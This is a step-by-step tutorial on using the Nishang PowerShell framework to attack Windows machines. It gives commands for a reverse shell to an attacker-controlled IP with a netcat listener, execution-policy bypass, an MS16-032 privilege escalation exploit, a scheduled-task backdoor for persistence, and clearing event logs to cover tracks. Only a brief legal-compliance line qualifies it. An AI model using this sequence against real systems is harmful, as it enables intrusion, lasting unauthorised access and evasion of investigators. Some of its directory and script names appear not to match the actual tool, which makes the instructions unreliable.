# Nishang

## Step-by-Step Tutorial on Using Nishang for Cybersecurity

Nishang is a framework and collection of PowerShell scripts used in penetration testing and offensive security. It provides various tools for tasks like payload generation, privilege escalation, and information gathering.


### 1. **Setting Up Your Environment**

#### **1.1. Install PowerShell on Your Machine**
If you're using a Windows machine, PowerShell should already be installed. If you're on Linux or macOS, you can install PowerShell using the following commands:

- **For Linux:**
  ```bash
  sudo apt-get update
  sudo apt-get install -y powershell
  ```
  
- **For macOS:**
  ```bash
  brew install --cask powershell
  ```

#### **1.2. Download Nishang**
You can download Nishang directly from its GitHub repository.

```bash
git clone https://github.com/samratashok/nishang
```

This command will clone the repository into a directory named `nishang`.

#### **1.3. Navigate to the Nishang Directory**
Move into the directory where Nishang is stored:

```bash
cd nishang
```

### 2. **Generating Payloads**

Nishang is widely used for generating payloads that can be used for various types of attacks, such as reverse shells.

#### **2.1. Generate a Reverse Shell Payload**

Navigate to the `Shells` directory:

```bash
cd Shells
```

Here you will find multiple scripts for different types of shells. Let's generate a reverse shell:

- **For a TCP reverse shell:**
  Open `Invoke-PowerShellTcp.ps1` in a text editor. Modify the script to include your attacker's IP and port:

  ```powershell
  Invoke-PowerShellTcp -Reverse -IPAddress <Your_IP_Address> -Port <Your_Port>
  ```

- **Save the script:** Once you've modified the script, save it.

- **Start a listener on your attacking machine:** You can use tools like Netcat for this purpose:

  ```bash
  nc -lvnp <Your_Port>
  ```

#### **2.2. Execute the Payload on the Target Machine**
Copy the script to the target machine. Once there, execute it using PowerShell:

```powershell
powershell -ExecutionPolicy Bypass -File .\Invoke-PowerShellTcp.ps1
```

This will create a reverse shell connection to your attacking machine.

### 3. **Privilege Escalation**

Nishang includes scripts to help with privilege escalation on a compromised system.

#### **3.1. Check for Privilege Escalation Opportunities**

Navigate to the `Elevate` directory within Nishang:

```bash
cd ../Elevate
```

- **Use the `Invoke-MS16-032.ps1` script**: This script exploits a vulnerability in the Windows operating system to escalate privileges.

  ```powershell
  .\Invoke-MS16-032.ps1
  ```

  If the exploit is successful, it will give you SYSTEM privileges on the target machine.

### 4. **Information Gathering**

Nishang also includes scripts for gathering information about the target system.

#### **4.1. System Information Collection**

Navigate to the `Gather` directory:

```bash
cd ../Gather
```

- **Use the `Get-Information.ps1` script**: This script collects detailed system information, including OS version, installed software, network configuration, and more.

  ```powershell
  .\Get-Information.ps1
  ```

  The script will output the collected information, which you can analyze for further exploitation.

### 5. **Persistence**

Maintaining access to a compromised system is crucial. Nishang provides scripts to establish persistence.

#### **5.1. Create a Persistent Backdoor**

Navigate to the `Persistence` directory:

```bash
cd ../Persistence
```

- **Use the `Add-SchtasksBackdoor.ps1` script**: This script creates a scheduled task that runs your payload every time the user logs in.

  ```powershell
  .\Add-SchtasksBackdoor.ps1 -PayloadPath <Path_to_Your_Payload>
  ```

  This ensures that even if the system is rebooted, you regain access.

### 6. **Clearing Tracks**

After an operation, it's crucial to remove any traces of your activities to avoid detection.

#### **6.1. Clear Logs**

Navigate to the `Antiforensics` directory:

```bash
cd ../Antiforensics
```

- **Use the `Invoke-EventLogBypass.ps1` script**: This script clears Windows Event Logs to remove traces of your activities.

  ```powershell
  .\Invoke-EventLogBypass.ps1
  ```

  This helps in covering your tracks.

### 7. **Advanced Usage**

Nishang has several other advanced functionalities. Some key areas to explore:

- **Data Exfiltration:** Scripts for extracting data from a compromised system.
- **Bypassing UAC:** Methods to bypass User Account Control (UAC) in Windows.
- **Network Pivoting:** Use Nishang scripts to pivot through networks once inside a compromised machine.

### 8. **Best Practices**

- **Testing in a Lab Environment:** Always test scripts in a controlled lab environment before deploying them in the field.
- **Updating Nishang:** Regularly update Nishang to ensure you have the latest scripts and improvements.
- **Legal Compliance:** Ensure that all actions taken with Nishang are within the bounds of legal and ethical guidelines.

